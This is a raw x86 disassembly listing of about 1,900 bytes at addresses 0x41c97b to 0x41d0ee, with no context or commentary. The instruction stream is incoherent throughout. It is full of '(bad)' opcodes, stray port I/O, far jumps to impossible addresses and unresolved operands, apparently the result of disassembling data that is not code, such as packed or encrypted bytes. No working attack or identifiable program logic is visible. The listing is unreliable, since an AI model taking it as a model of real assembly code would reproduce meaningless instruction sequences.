  41c97b:	add    ch,ch
  41c97d:	push   0xffffffd7
  41c97f:	test   al,0xd4
  41c981:	ds inc edx
  41c983:	rcr    BYTE PTR [eax+0x3b],cl
  41c986:	fcomp  QWORD PTR [ecx-0x37]
  41c989:	mov    eax,0xbfa64ab0
  41c98e:	mov    ebp,0xdba1172b
  41c993:	cmp    ecx,ebp
  41c995:	mov    ds:0x10bfaf25,al
  41c99a:	mov    ecx,0xcac019bc
  41c99f:	arpl   WORD PTR [edi+0x36],di
  41c9a2:	pop    edi
  41c9a3:	or     bl,BYTE PTR [edi]
  41c9a5:	retf   0x58c4
  41c9a8:	sbb    cl,0x4e
  41c9ab:	push   es
  41c9ac:	or     esi,esi
  41c9ae:	sbb    bh,bh
  41c9b0:	add    al,0x9a
  41c9b2:	and    al,0x6
  41c9b4:	cmc    
  41c9b5:	jnp    0x41ca20
  41c9b7:	call   0x3883e909
  41c9bc:	in     al,dx
  41c9bd:	mov    ebp,0x3c998bb2
  41c9c2:	push   esi
  41c9c3:	test   BYTE PTR [ecx],ah
  41c9c5:	or     bl,dh
  41c9c7:	aad    0x85
  41c9c9:	les    ebp,FWORD PTR [esp+esi*1+0x69]
  41c9cd:	jo     0x41c9a5
  41c9cf:	pop    ss
  41c9d0:	retf   
  41c9d1:	imul   eax,DWORD PTR [edi],0xffffffe0
  41c9d4:	int3   
  41c9d5:	adc    eax,0xfea492c1
  41c9da:	mov    dl,0x2
  41c9dc:	add    al,0xe6
  41c9de:	mov    WORD PTR [edx-0x22],?
  41c9e1:	scas   al,BYTE PTR es:[edi]
  41c9e2:	in     eax,0x4f
  41c9e4:	scas   eax,DWORD PTR es:[edi]
  41c9e5:	xor    eax,0x18ac5e1a
  41c9ea:	mov    cl,0xd3
  41c9ec:	loopne 0x41ca3f
  41c9ee:	jns    0x41c9b1
  41c9f0:	jo     0x41c994
  41c9f2:	mov    bl,BYTE PTR [edi-0x723ec218]
  41c9f8:	fs pop esp
  41c9fa:	xor    al,0x4e
  41c9fc:	mov    edi,0xed53d0c5
  41ca01:	add    al,0xf8
  41ca03:	push   0xffffffc6
  41ca05:	xor    BYTE PTR [ebp+0x70],bl
  41ca08:	mov    dh,0xad
  41ca0a:	pop    edi
  41ca0b:	mov    eax,0x68834c03
  41ca10:	gs jmp 0xe51aa718
  41ca16:	sbb    eax,0x6353473a
  41ca1b:	xor    BYTE PTR [edi+0x1a],ah
  41ca1e:	jge    0x41ca29
  41ca20:	mov    ah,0x58
  41ca22:	daa    
  41ca23:	push   ds
  41ca24:	enter  0xa51b,0x98
  41ca28:	xor    al,0x54
  41ca2a:	ret    0x9b59
  41ca2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca2e:	mov    ds:0x10dceadb,eax
  41ca33:	shr    ecx,1
  41ca35:	mov    BYTE PTR [ebx],al
  41ca37:	add    esp,DWORD PTR [ecx+0x42]
  41ca3a:	xor    ecx,DWORD PTR [ecx-0x3e56757c]
  41ca40:	xchg   esp,eax
  41ca41:	mov    esi,0xb7e8c05e
  41ca46:	mov    edx,0x5ee46e35
  41ca4b:	sbb    edx,DWORD PTR [edx+0x1f5d8955]
  41ca51:	pop    edx
  41ca52:	mul    DWORD PTR [edi]
  41ca54:	xchg   esi,eax
  41ca55:	jbe    0x41ca08
  41ca57:	push   edx
  41ca58:	cmp    ebx,edx
  41ca5a:	sbb    al,0xbd
  41ca5c:	mov    edx,0xf7afde6e
  41ca61:	mov    ch,BYTE PTR [esi]
  41ca63:	(bad)  
  41ca64:	repz push esi
  41ca66:	pop    ebp
  41ca67:	out    0x7e,eax
  41ca69:	popa   
  41ca6a:	jb     0x41ca75
  41ca6c:	sub    ecx,eax
  41ca6e:	ins    DWORD PTR es:[edi],dx
  41ca6f:	sbb    al,0xe5
  41ca71:	mov    edi,0x44f6f6f3
  41ca76:	lahf   
  41ca77:	xlat   BYTE PTR ds:[ebx]
  41ca78:	or     DWORD PTR [ecx-0x643a244c],edx
  41ca7e:	loope  0x41cafa
  41ca80:	mov    esi,0xa9760b97
  41ca85:	(bad)  [ebx+ecx*2+0x2118b700]
  41ca8c:	jno    0x41cae0
  41ca8e:	fcomp  DWORD PTR [eax]
  41ca90:	mov    bh,0xb6
  41ca92:	arpl   WORD PTR [ebp+0x2f],di
  41ca95:	mov    ebx,0x2c27b3a4
  41ca9a:	mov    dh,0x4e
  41ca9c:	mov    ebp,?
  41ca9e:	xor    eax,0x14c6cb2f
  41caa3:	mov    WORD PTR [edx],ds
  41caa5:	mov    cl,BYTE PTR [ebp+0x16]
  41caa8:	in     al,0x23
  41caaa:	scas   eax,DWORD PTR es:[edi]
  41caab:	push   es
  41caac:	sub    al,0x81
  41caae:	xor    BYTE PTR [edx],dh
  41cab0:	lahf   
  41cab1:	cmc    
  41cab2:	pusha  
  41cab3:	imul   edx,edx,0xd448ca31
  41cab9:	ds jns 0x41ca4f
  41cabc:	inc    ebx
  41cabd:	lock sub DWORD PTR [ebp-0x40],ecx
  41cac1:	mov    dh,0xf9
  41cac3:	cli    
  41cac4:	adc    eax,0x2c9a9fce
  41cac9:	jbe    0x41cb08
  41cacb:	sbb    al,0x46
  41cacd:	push   ebp
  41cace:	xchg   edx,eax
  41cacf:	add    DWORD PTR ds:0x2a7f7d36,edi
  41cad5:	fwait
  41cad6:	cs loopne 0x41cb3b
  41cad9:	in     eax,dx
  41cada:	sub    al,BYTE PTR [ecx+0x1c]
  41cadd:	fidivr WORD PTR ds:0x81c8ebca
  41cae3:	lods   eax,DWORD PTR ds:[esi]
  41cae4:	dec    ecx
  41cae5:	stc    
  41cae6:	and    DWORD PTR gs:[ebp+0x5],edi
  41caea:	test   BYTE PTR [eax],bl
  41caec:	outs   dx,DWORD PTR ds:[esi]
  41caed:	jle    0x41cb20
  41caef:	adc    eax,0x8e65e311
  41caf4:	icebp  
  41caf5:	jp     0x41caac
  41caf7:	adc    eax,0xea69018a
  41cafc:	icebp  
  41cafd:	lea    ebx,[esi-0x6d]
  41cb00:	stos   BYTE PTR es:[edi],al
  41cb01:	xor    al,0xa2
  41cb03:	jbe    0x41cb07
  41cb05:	pop    ds
  41cb06:	mov    al,ds:0x8d16b939
  41cb0b:	cmp    DWORD PTR [ecx+0x39],ebx
  41cb0e:	sbb    ebx,DWORD PTR [ebx+eax*4]
  41cb11:	and    BYTE PTR [edx+edx*8],al
  41cb14:	jne    0x41caf1
  41cb16:	cmp    ch,cl
  41cb18:	arpl   cx,si
  41cb1a:	xor    ebx,DWORD PTR [edi]
  41cb1c:	aam    0xa
  41cb1e:	popf   
  41cb1f:	retf   0xbbc6
  41cb22:	xor    cl,0xa4
  41cb25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb26:	jb     0x41cb91
  41cb28:	add    esp,DWORD PTR [edx-0x51]
  41cb2b:	mov    bl,0xaf
  41cb2d:	cli    
  41cb2e:	and    DWORD PTR [ecx],ebp
  41cb30:	test   al,0x47
  41cb32:	or     eax,0x1a24c306
  41cb37:	stos   BYTE PTR es:[edi],al
  41cb38:	and    edi,DWORD PTR [eax-0x28]
  41cb3b:	mov    eax,0x581b3a58
  41cb40:	or     DWORD PTR [eax-0x56],0xffffffc9
  41cb44:	push   0xf950d97c
  41cb49:	jge    0x41cb30
  41cb4b:	mov    eax,0x1e1d7848
  41cb50:	jecxz  0x41cadc
  41cb52:	(bad)  
  41cb53:	test   esi,esp
  41cb55:	popf   
  41cb56:	add    ebx,ebx
  41cb58:	mov    ss,ecx
  41cb5a:	loopne 0x41cbc8
  41cb5c:	out    0xeb,al
  41cb5e:	gs xchg ebp,eax
  41cb60:	jb     0x41cb39
  41cb62:	retf   
  41cb63:	ret    0xa885
  41cb66:	arpl   ax,cx
  41cb68:	add    BYTE PTR [bx],bh
  41cb6b:	mov    eax,ds:0xf0dacf5b
  41cb70:	xchg   edx,eax
  41cb71:	mov    edi,0x9abd7289
  41cb76:	stos   DWORD PTR es:[edi],eax
  41cb77:	fs popf 
  41cb79:	push   cs
  41cb7a:	inc    esi
  41cb7b:	stos   BYTE PTR es:[edi],al
  41cb7c:	cld    
  41cb7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb7e:	lock loope 0x41cb7d
  41cb81:	push   0x77
  41cb83:	or     eax,0x54719e37
  41cb88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb89:	inc    edx
  41cb8a:	outs   dx,BYTE PTR ds:[esi]
  41cb8b:	pop    ebx
  41cb8c:	lock call 0x2841d8f
  41cb92:	push   ebp
  41cb93:	ror    DWORD PTR ds:0xe239d612,1
  41cb99:	loop   0x41cc07
  41cb9b:	lahf   
  41cb9c:	sahf   
  41cb9d:	cli    
  41cb9e:	int    0xce
  41cba0:	(bad)  
  41cba1:	(bad)  
  41cba2:	xor    ah,BYTE PTR [esp+edi*1]
  41cba5:	sub    BYTE PTR [esi+esi*4],cl
  41cba8:	jbe    0x41cc22
  41cbaa:	or     BYTE PTR [ebp+0x6fbe6ca8],ah
  41cbb0:	je     0x41cb84
  41cbb2:	mov    BYTE PTR [eax-0x31],0x97
  41cbb6:	pop    ebp
  41cbb7:	inc    edx
  41cbb8:	inc    edi
  41cbb9:	pop    ecx
  41cbba:	retf   0x29c8
  41cbbd:	iret   
  41cbbe:	pop    edi
  41cbbf:	mov    ds:0x1b0ac6ff,al
  41cbc4:	sub    eax,0xa29aea51
  41cbc9:	pop    eax
  41cbca:	(bad)  
  41cbcb:	cwde   
  41cbcc:	ins    DWORD PTR es:[edi],dx
  41cbcd:	call   0xc9dd:0xc5abd6d5
  41cbd4:	or     DWORD PTR [ebp+0x70],edx
  41cbd7:	or     ah,BYTE PTR [ebx]
  41cbd9:	mov    edi,esi
  41cbdb:	pop    ebx
  41cbdc:	jp     0x41cbfd
  41cbde:	aaa    
  41cbdf:	inc    edx
  41cbe0:	xchg   DWORD PTR [ecx],esi
  41cbe2:	xchg   BYTE PTR [edi-0x4947f38f],dh
  41cbe8:	retf   
  41cbe9:	xor    DWORD PTR [ebp-0x3339afb9],esp
  41cbef:	or     bl,BYTE PTR [ecx-0x3f]
  41cbf2:	sbb    al,0xe1
  41cbf4:	rcr    DWORD PTR [edx],1
  41cbf6:	enter  0x478f,0xa7
  41cbfa:	push   ebx
  41cbfb:	aam    0xfe
  41cbfd:	imul   eax,DWORD PTR [edx-0x37],0xffffffc7
  41cc01:	fwait
  41cc02:	inc    edi
  41cc03:	xchg   ah,ch
  41cc05:	xor    DWORD PTR [eax+0x61],ebp
  41cc08:	cmp    al,0x28
  41cc0a:	js     0x41cbd2
  41cc0c:	call   0x66edf791
  41cc11:	aad    0xfb
  41cc13:	shl    esp,1
  41cc15:	xchg   ecx,eax
  41cc16:	mov    ebx,esi
  41cc18:	or     al,0xab
  41cc1a:	mov    eax,0xf6a74b5e
  41cc1f:	mov    ch,0x7c
  41cc21:	mov    al,BYTE PTR [ebp-0x540517f7]
  41cc27:	xchg   esi,eax
  41cc28:	jp     0x41cc36
  41cc2a:	in     al,dx
  41cc2b:	mov    ch,BYTE PTR [edx+ebp*1]
  41cc2e:	daa    
  41cc2f:	ss mov edi,0x9f5a7a7f
  41cc35:	sti    
  41cc36:	sbb    al,0x6f
  41cc39:	inc    ecx
  41cc3a:	cli    
  41cc3b:	nop
  41cc3c:	add    al,0x60
  41cc3e:	and    BYTE PTR [edx-0x1886119e],al
  41cc44:	call   0xb2c07d16
  41cc49:	shl    DWORD PTR [edi-0x2721cbb],0xa4
  41cc50:	mov    ds:0x5bb0fb7c,eax
  41cc55:	mov    edx,0xa70744e0
  41cc5a:	push   ebp
  41cc5b:	pop    eax
  41cc5c:	std    
  41cc5d:	xchg   BYTE PTR [eax+ecx*2-0x78e412f],bh
  41cc64:	call   0xa704:0x2891ca5f
  41cc6b:	nop
  41cc6c:	rcl    ebx,0x9e
  41cc6f:	sbb    BYTE PTR [ecx],dh
  41cc71:	repnz cmp eax,0x975402c5
  41cc77:	ins    DWORD PTR es:[edi],dx
  41cc78:	mov    ds:0x36d12dea,eax
  41cc7d:	(bad)  
  41cc7e:	fucom  st(4)
  41cc80:	sti    
  41cc81:	out    0x9a,eax
  41cc83:	jne    0x41cca6
  41cc85:	ss pusha 
  41cc87:	sub    bh,BYTE PTR ds:0xd5fd9d95
  41cc8d:	sub    eax,0x6ac6fe7e
  41cc92:	dec    esp
  41cc93:	hlt    
  41cc94:	mov    ds:0xf7bec855,eax
  41cc99:	jmp    0x41ccaa
  41cc9b:	ret    0x7429
  41cc9e:	pop    eax
  41cc9f:	cdq    
  41cca0:	sbb    dh,al
  41cca2:	dec    ecx
  41cca3:	or     ebx,esi
  41cca5:	test   BYTE PTR [esi+0x62],dh
  41cca8:	adc    eax,0xf49e9128
  41ccad:	inc    esp
  41ccae:	fdivr  QWORD PTR [ecx]
  41ccb0:	gs push edi
  41ccb2:	lock sub al,0xc9
  41ccb5:	dec    ebp
  41ccb6:	nop
  41ccb7:	fdivr  QWORD PTR [ebp+0x9]
  41ccba:	mov    edx,0xb9fc395c
  41ccbf:	or     eax,0xd6f8b2c5
  41ccc4:	out    0x2d,al
  41ccc6:	ins    BYTE PTR es:[edi],dx
  41ccc7:	pop    eax
  41ccc8:	lods   al,BYTE PTR ds:[esi]
  41ccc9:	mov    al,0x4
  41cccb:	stos   DWORD PTR es:[edi],eax
  41cccc:	adc    DWORD PTR [ebp+0x75],0xfffffff2
  41ccd0:	fld    st(3)
  41ccd2:	fisubr WORD PTR [edx-0x65528281]
  41ccd8:	cs inc esp
  41ccda:	js     0x41cd58
  41ccdc:	rcr    BYTE PTR [ecx-0x27e20460],cl
  41cce2:	in     al,dx
  41cce3:	push   ecx
  41cce4:	push   ss
  41cce5:	jmp    FWORD PTR [ecx+0x15d7a948]
  41cceb:	xlat   BYTE PTR ds:[ebx]
  41ccec:	fxch   st(3)
  41ccee:	fs (bad) 
  41ccf0:	ds out 0x50,al
  41ccf3:	inc    ebx
  41ccf4:	std    
  41ccf5:	adc    ch,ah
  41ccf7:	aam    0x8f
  41ccf9:	jle    0x41cd47
  41ccfb:	cld    
  41ccfc:	cmc    
  41ccfd:	xchg   edx,eax
  41ccfe:	loope  0x41cd30
  41cd00:	scas   eax,DWORD PTR es:[edi]
  41cd01:	cli    
  41cd02:	xchg   ebp,eax
  41cd03:	sub    eax,0x5a422581
  41cd08:	pop    eax
  41cd09:	(bad)  
  41cd0a:	mov    bh,0x4d
  41cd0c:	mov    eax,ds:0x77dd590f
  41cd11:	jnp    0x41cd37
  41cd13:	mov    DWORD PTR [ecx-0x6f],0x5dfe3983
  41cd1a:	rol    BYTE PTR [ebp-0x1b720fef],0xd4
  41cd21:	xor    al,0x1e
  41cd23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd24:	lea    esp,[edi]
  41cd26:	(bad)  
  41cd28:	or     al,0xb1
  41cd2a:	adc    dh,cl
  41cd2c:	stos   DWORD PTR es:[edi],eax
  41cd2d:	jbe    0x41ccbf
  41cd2f:	sbb    ah,bl
  41cd31:	inc    esi
  41cd32:	int    0x37
  41cd34:	lods   eax,DWORD PTR ds:[esi]
  41cd35:	out    0x8f,eax
  41cd37:	cmp    esi,DWORD PTR [edi]
  41cd39:	inc    ebp
  41cd3a:	jmp    0x41ccff
  41cd3c:	aas    
  41cd3d:	mov    esp,0xc99672a6
  41cd42:	push   ds
  41cd43:	in     eax,0xf3
  41cd45:	shr    BYTE PTR [edi],0xc0
  41cd48:	retf   0x8f98
  41cd4b:	cmp    dh,BYTE PTR [eax]
  41cd4d:	imul   eax,ebx,0x57
  41cd50:	pop    edi
  41cd51:	jmp    DWORD PTR [esi]
  41cd53:	je     0x41cce6
  41cd55:	fs ret 0x3d47
  41cd59:	xlat   BYTE PTR ds:[ebx]
  41cd5a:	jecxz  0x41cd6b
  41cd5c:	jmp    0x41cd00
  41cd5e:	push   0x154da998
  41cd63:	outs   dx,DWORD PTR ds:[esi]
  41cd64:	inc    cx
  41cd66:	outs   dx,BYTE PTR ds:[esi]
  41cd67:	pop    es
  41cd68:	push   0x40
  41cd6a:	push   0x35e00f3c
  41cd6f:	test   DWORD PTR [ebx-0x59],ecx
  41cd72:	fistp  WORD PTR [edi+0x5e7b0c14]
  41cd78:	(bad)  
  41cd7b:	push   0xffffffd1
  41cd7d:	mov    gs,WORD PTR [eax-0x5752517c]
  41cd83:	ds imul ebp,DWORD PTR fs:[esi],0x93a9638b
  41cd8b:	and    dh,dh
  41cd8d:	push   ecx
  41cd8e:	bound  eax,QWORD PTR ds:0xe65145b5
  41cd94:	hlt    
  41cd95:	arpl   WORD PTR ds:0xd165f06a,bp
  41cd9b:	mov    ecx,0x6a720879
  41cda0:	test   eax,0xfbc5817e
  41cda5:	mov    ds:0xf8671f8c,eax
  41cdaa:	add    ah,BYTE PTR ds:0x176e6899
  41cdb0:	cmp    ebx,DWORD PTR es:[esi-0x11]
  41cdb4:	add    DWORD PTR [edi+0x607d04a0],esi
  41cdba:	cmp    eax,0x7bbe45b0
  41cdbf:	loop   0x41ce19
  41cdc1:	and    al,0x5
  41cdc3:	jmp    0x344ec179
  41cdc8:	pop    es
  41cdc9:	test   DWORD PTR [edx+0x12],ebx
  41cdcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdcd:	inc    esi
  41cdce:	dec    ecx
  41cdcf:	inc    ebx
  41cdd0:	or     al,0x8d
  41cdd2:	iret   
  41cdd3:	sbb    esi,0xfffffff0
  41cdd6:	fst    QWORD PTR [edi]
  41cdd8:	push   edi
  41cdd9:	and    ebx,DWORD PTR [edx-0x4bcd29f4]
  41cddf:	or     eax,0x90062164
  41cde4:	bnd jne 0x41ce19
  41cde7:	jmp    0x41cd69
  41cde9:	mov    ebx,0x267bc09c
  41cdee:	fistp  QWORD PTR ds:0xd994649e
  41cdf4:	(bad)  
  41cdf5:	cld    
  41cdf6:	xchg   ebx,eax
  41cdf7:	dec    edi
  41cdf8:	cs ja  0x41cdc2
  41cdfb:	ficomp DWORD PTR [ebp+0x28e8ada5]
  41ce01:	cmp    al,0xe8
  41ce03:	or     edi,esp
  41ce05:	test   DWORD PTR [edx+0x73],0x13d93fba
  41ce0c:	test   eax,0x4e80ba6a
  41ce11:	cdq    
  41ce12:	dec    edi
  41ce13:	lock test BYTE PTR [ebx],ah
  41ce16:	cli    
  41ce17:	js     0x41ce07
  41ce19:	jp     0x41ce77
  41ce1b:	mov    eax,ds:0x8b3f6047
  41ce20:	push   cs
  41ce21:	xchg   ebx,eax
  41ce22:	jbe    0x41ce86
  41ce24:	nop
  41ce25:	mul    DWORD PTR [edi+0x4575e5fa]
  41ce2b:	repz xchg esi,eax
  41ce2d:	pop    DWORD PTR [eax+0x26]
  41ce30:	xor    ebx,DWORD PTR [esi+0x30]
  41ce33:	xchg   edx,eax
  41ce34:	mov    ds:0x8c71eb9f,al
  41ce39:	not    BYTE PTR [ebx]
  41ce3b:	(bad)  
  41ce3c:	push   eax
  41ce3d:	cld    
  41ce3e:	ret    
  41ce3f:	out    0x89,al
  41ce41:	jns    0x41cdc6
  41ce43:	adc    BYTE PTR [ecx-0x50cf1290],ch
  41ce49:	pop    ss
  41ce4a:	sar    dl,0xd5
  41ce4d:	jp     0x41ce2e
  41ce4f:	and    eax,0x453538be
  41ce54:	and    eax,0xf73ab745
  41ce59:	stc    
  41ce5a:	mov    edi,0x8411aa15
  41ce5f:	push   ecx
  41ce60:	mov    ds:0xa59e2a47,eax
  41ce65:	mov    al,0xe6
  41ce67:	or     ecx,ecx
  41ce69:	ja     0x41ce97
  41ce6b:	leave  
  41ce6c:	jmp    FWORD PTR [edi-0x7d5fb110]
  41ce72:	gs jge 0x41ceb2
  41ce75:	xor    esi,DWORD PTR [esi+0x2dde036]
  41ce7b:	mov    al,ds:0x2aa2f2b4
  41ce80:	xchg   DWORD PTR [edi+esi*4+0x12],edi
  41ce84:	sub    dh,0xea
  41ce87:	rcr    BYTE PTR [ebp+0x1ee3fb55],cl
  41ce8d:	out    dx,al
  41ce8e:	xchg   esp,eax
  41ce8f:	sub    BYTE PTR [ebp+0x53],dl
  41ce92:	loope  0x41cea2
  41ce94:	sar    edx,cl
  41ce96:	mov    eax,0x26f3dcd1
  41ce9b:	xchg   edx,eax
  41ce9c:	xchg   edx,eax
  41ce9d:	mov    al,ds:0x456626f7
  41cea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cea3:	iret   
  41cea4:	xchg   ebp,eax
  41cea5:	in     eax,dx
  41cea6:	fwait
  41cea7:	and    BYTE PTR [esi+eiz*1-0x26],0x85
  41ceac:	pop    ebx
  41cead:	xchg   esi,eax
  41ceae:	out    dx,al
  41ceaf:	xlat   BYTE PTR ds:[ebx]
  41ceb0:	cmp    al,0xd6
  41ceb2:	clc    
  41ceb3:	ds mov ah,0xb5
  41ceb6:	bound  esp,QWORD PTR [edx-0x14c151f9]
  41cebc:	jnp    0x41cf1a
  41cebe:	popa   
  41cebf:	jmp    0x5db3cd7a
  41cec4:	pop    eax
  41cec5:	xchg   ebp,eax
  41cec6:	add    eax,0x70acdefd
  41cecb:	cmp    DWORD PTR [ebx+ebx*8-0x3d],ecx
  41cecf:	(bad)  
  41ced0:	jbe    0x41cee1
  41ced2:	jge    0x41ce93
  41ced4:	and    eax,0x6077a57d
  41ced9:	add    ecx,DWORD PTR [ecx+0x6144b360]
  41cedf:	ja     0x41ceec
  41cee1:	and    al,0x7c
  41cee3:	and    al,0x8
  41cee5:	daa    
  41cee6:	(bad)  
  41cee7:	ror    DWORD PTR [ecx-0x5e2d12af],cl
  41ceed:	push   esp
  41ceee:	pop    es
  41ceef:	out    0x9d,eax
  41cef1:	jp     0x41cf0c
  41cef3:	dec    edx
  41cef4:	jmp    0x2808f3e3
  41cef9:	cli    
  41cefa:	sti    
  41cefb:	out    dx,eax
  41cefc:	pop    ebx
  41cefd:	or     edx,DWORD PTR [ebx-0x4c]
  41cf00:	cmp    BYTE PTR [edx],ch
  41cf02:	aam    0x9
  41cf04:	out    dx,al
  41cf05:	dec    ebx
  41cf06:	(bad)  
  41cf07:	test   al,0xbb
  41cf09:	sbb    eax,0xd3e80df4
  41cf0e:	cld    
  41cf0f:	mov    ebp,0xc588e47c
  41cf14:	jle    0x41cf69
  41cf16:	lock push edi
  41cf18:	and    eax,0x2bc49100
  41cf1d:	data16 setg BYTE PTR ds:0x3e7bde3f
  41cf25:	jge    0x41cf84
  41cf27:	icebp  
  41cf28:	loopne 0x41cf9b
  41cf2a:	sub    ecx,DWORD PTR [edx+eax*1]
  41cf2d:	lea    esi,[edx+0x7e61d588]
  41cf33:	xor    DWORD PTR [ebx-0x5f],ebx
  41cf36:	mov    esi,0x2fd723d8
  41cf3b:	pop    ebx
  41cf3c:	not    dl
  41cf3e:	(bad)  
  41cf40:	push   edx
  41cf41:	jge    0x41cee0
  41cf43:	xor    DWORD PTR [ebx-0x2c96848e],esi
  41cf49:	loopne 0x41cf84
  41cf4b:	sub    DWORD PTR [edi],ebx
  41cf4d:	sbb    al,0x1
  41cf4f:	inc    ecx
  41cf50:	shr    BYTE PTR [edx+0x50a41b1e],cl
  41cf56:	mov    esp,0x498ad207
  41cf5b:	cmp    al,0xa2
  41cf5d:	adc    esi,esi
  41cf5f:	adc    bh,BYTE PTR [esi]
  41cf61:	shl    DWORD PTR [esp+ecx*8],cl
  41cf64:	cwde   
  41cf65:	mov    WORD PTR [edi+ebx*2-0x58],ss
  41cf69:	xchg   esp,eax
  41cf6a:	pusha  
  41cf6b:	lods   eax,DWORD PTR ds:[esi]
  41cf6c:	fwait
  41cf6d:	retf   0xe1a1
  41cf70:	lods   eax,DWORD PTR ds:[esi]
  41cf71:	repz imul edi,DWORD PTR [ecx-0x53f1e2cf],0x14e68465
  41cf7c:	dec    ebx
  41cf7d:	mov    esp,0xc033ba9a
  41cf82:	in     eax,0x8d
  41cf84:	and    eax,0xd95c064d
  41cf89:	fisub  WORD PTR [ecx+ebp*8-0x44]
  41cf8d:	and    DWORD PTR [ecx-0xe],0x34d16598
  41cf94:	xor    DWORD PTR [ebx+0x9a126db],eax
  41cf9a:	xchg   esp,eax
  41cf9b:	xchg   edx,eax
  41cf9c:	or     BYTE PTR [ebx+0x6c227e38],al
  41cfa2:	enter  0x8cba,0x62
  41cfa6:	jns    0x41cf8b
  41cfa8:	lahf   
  41cfa9:	xlat   BYTE PTR ds:[ebx]
  41cfaa:	pop    ebp
  41cfab:	mov    DWORD PTR [edx-0x584ac060],ebp
  41cfb1:	(bad)  
  41cfb2:	in     al,dx
  41cfb3:	and    al,dl
  41cfb5:	mov    gs,WORD PTR [ebx+ebx*1]
  41cfb8:	es xchg ecx,eax
  41cfba:	fdiv   DWORD PTR [eiz*2+0x62fd27e6]
  41cfc1:	out    0x68,al
  41cfc3:	pop    esi
  41cfc4:	std    
  41cfc5:	xchg   esi,eax
  41cfc6:	or     esi,ebx
  41cfc8:	adc    al,0xf9
  41cfca:	dec    ebp
  41cfcb:	je     0x41cfbb
  41cfcd:	inc    esp
  41cfce:	xor    al,0x1f
  41cfd0:	dec    eax
  41cfd1:	das    
  41cfd2:	inc    DWORD PTR [eax]
  41cfd4:	mov    esp,0xdab0377e
  41cfd9:	inc    edi
  41cfda:	fild   QWORD PTR [ebp+0x55a40348]
  41cfe0:	adc    DWORD PTR [ecx+0x51a0d43f],0x2f7da6e4
  41cfea:	push   cs
  41cfeb:	xor    bl,bl
  41cfed:	or     edi,DWORD PTR [ebx]
  41cfef:	xchg   esi,eax
  41cff0:	pop    ss
  41cff1:	test   eax,0x71c77d7f
  41cff6:	sub    al,0x75
  41cff9:	out    dx,al
  41cffa:	pusha  
  41cffb:	bound  edi,QWORD PTR [edi]
  41cffd:	ffreep st(1)
  41cfff:	pop    esi
  41d000:	and    BYTE PTR [ecx],0x99
  41d003:	push   ebp
  41d004:	xor    BYTE PTR [edx+0x72490e71],bl
  41d00a:	pop    eax
  41d00b:	sti    
  41d00c:	inc    eax
  41d00d:	push   ss
  41d00e:	mov    ?,WORD PTR [edi-0x3a]
  41d011:	push   ebx
  41d012:	adc    ch,BYTE PTR [ebx]
  41d014:	repnz sbb al,BYTE PTR fs:[esi+ebx*1-0x3]
  41d01a:	inc    edi
  41d01b:	and    ebx,DWORD PTR [edx]
  41d01d:	es mov dh,0xfc
  41d020:	dec    edx
  41d021:	push   edi
  41d022:	fidiv  DWORD PTR [edx+edx*4+0x23]
  41d026:	jb     0x41d09f
  41d028:	sbb    BYTE PTR [eax],ah
  41d02a:	pop    ebp
  41d02b:	ror    BYTE PTR [edx-0x4ec643ac],cl
  41d031:	add    eax,0x15344a49
  41d036:	(bad)  
  41d037:	cli    
  41d038:	pop    ss
  41d039:	jb     0x41cfc1
  41d03b:	es mov edx,0xbb1bac7
  41d041:	js     0x41d00d
  41d043:	ror    BYTE PTR [ecx],0x18
  41d046:	pop    ecx
  41d047:	fld    TBYTE PTR [ecx+0x59]
  41d04a:	fist   WORD PTR [edx-0x2c70fe00]
  41d050:	mov    eax,0x3f28e6ee
  41d055:	leave  
  41d056:	ins    DWORD PTR es:[edi],dx
  41d057:	mov    bl,0xef
  41d059:	xchg   ecx,eax
  41d05a:	addr16 push ebx
  41d05c:	jae    0x41d05c
  41d05e:	xchg   BYTE PTR [esi],dl
  41d060:	push   eax
  41d061:	mov    DWORD PTR [eax+ebp*8],0x92d369b
  41d068:	push   esi
  41d069:	cwde   
  41d06a:	call   0x7c7d2db2
  41d06f:	add    eax,0xb201985e
  41d074:	fcomp  st(1)
  41d076:	jge    0x41d0db
  41d078:	adc    BYTE PTR [ebx+0x43],al
  41d07b:	out    dx,eax
  41d07c:	push   0x40
  41d07e:	(bad)  
  41d07f:	retf   
  41d080:	fld    TBYTE PTR [edx+0x5f]
  41d083:	cmp    BYTE PTR [ecx+ebx*4],0x48
  41d087:	fnsave [ebp+0x735ec385]
  41d08d:	push   ebp
  41d08e:	mov    esp,0xb14e56b6
  41d093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d094:	ret    0x2888
  41d097:	iret   
  41d098:	sar    DWORD PTR [edi],1
  41d09a:	retf   0xe4a8
  41d09d:	xchg   ebp,eax
  41d09e:	jp     0x41d092
  41d0a0:	scas   al,BYTE PTR es:[edi]
  41d0a1:	jns    0x41d04b
  41d0a3:	ret    
  41d0a4:	or     al,0x5
  41d0a6:	sub    BYTE PTR [edx+0x28c63e8a],bh
  41d0ac:	iret   
  41d0ad:	fdiv   QWORD PTR [edi]
  41d0af:	jno    0x41d06b
  41d0b1:	(bad)  
  41d0b2:	ins    BYTE PTR es:[edi],dx
  41d0b3:	sub    bl,BYTE PTR cs:[eax+0x263b57ad]
  41d0ba:	pop    ds
  41d0bb:	pushf  
  41d0bc:	pop    esp
  41d0bd:	push   esi
  41d0be:	push   ds
  41d0bf:	int3   
  41d0c0:	aad    0xcd
  41d0c2:	mov    WORD PTR [ecx-0x2a],?
  41d0c5:	push   cs
  41d0c6:	adc    al,BYTE PTR [ecx]
  41d0c8:	dec    ebp
  41d0c9:	lds    esi,FWORD PTR [ebx+0x1c987846]
  41d0cf:	pop    edx
  41d0d0:	pop    esp
  41d0d1:	lods   eax,DWORD PTR ds:[esi]
  41d0d2:	jmp    DWORD PTR [edx-0x26d0807a]
  41d0d8:	or     DWORD PTR [eax-0x2c],0x58c2449
  41d0df:	dec    ebp
  41d0e0:	xchg   edi,eax
  41d0e1:	ret    
  41d0e2:	xchg   esi,ebx
  41d0e4:	sahf   
  41d0e5:	pop    eax
  41d0e6:	or     edx,esi
  41d0e8:	aam    0x97
  41d0ea:	fisttp WORD PTR [eax]
  41d0ec:	sbb    al,0x33
  41d0ee:	push   eax
